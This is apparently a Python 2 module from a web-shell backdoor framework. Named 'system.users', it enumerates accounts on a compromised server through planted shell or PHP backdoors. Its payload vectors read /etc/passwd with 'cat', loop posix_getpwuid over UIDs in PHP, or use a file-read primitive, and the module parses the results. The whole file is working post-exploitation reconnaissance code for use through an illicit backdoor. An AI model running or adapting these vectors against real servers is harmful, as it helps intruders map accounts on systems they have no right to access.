'''
Created on 22/ago/2011

@author: norby
'''

from core.module import Module, ModuleException

classname = 'Users'
    
class Users(Module):
    """Enumerate system users informations using different techniques
    :system.users
    """
    
    vectors = { 
               'shell.sh' : { "cat"       : "cat %s"
                },
               
               'shell.php' : { 
                              "posix_getpwuid" : "for($n=0; $n<2000;$n++) { $uid = @posix_getpwuid($n); if ($uid) echo join(':',$uid).\'\n\';  }",
                              },
               'file.read' : {
                              "file.read" : "%s"
                              }
    
    }
    

    def __init__( self, modhandler , url, password):


        Module.__init__(self, modhandler, url, password)
        
        self.usersinfo = {}
        
                
    def run(self):
        
        for interpreter in self.vectors:
            for vector in self.vectors[interpreter]:
                if interpreter in self.modhandler.loaded_shells or interpreter == 'file.read':
                    payload = self.vectors[interpreter][vector] 
                    
                    if self.vectors[interpreter][vector].count('%s') == 1:
                        payload = payload % ('/etc/passwd')
                        
                    response = self.modhandler.load(interpreter).run(payload)
                    if response:
                        print "[system.users] Users enumerated using method '%s'" % vector
                        
                        for line in response.split('\n'):
                            userinf = line.split(':')
                            self.usersinfo[userinf[0]]=userinf[1:]
                        
                        return response

        raise ModuleException("system.users",  "Users enumeration failed")
        


    
    
    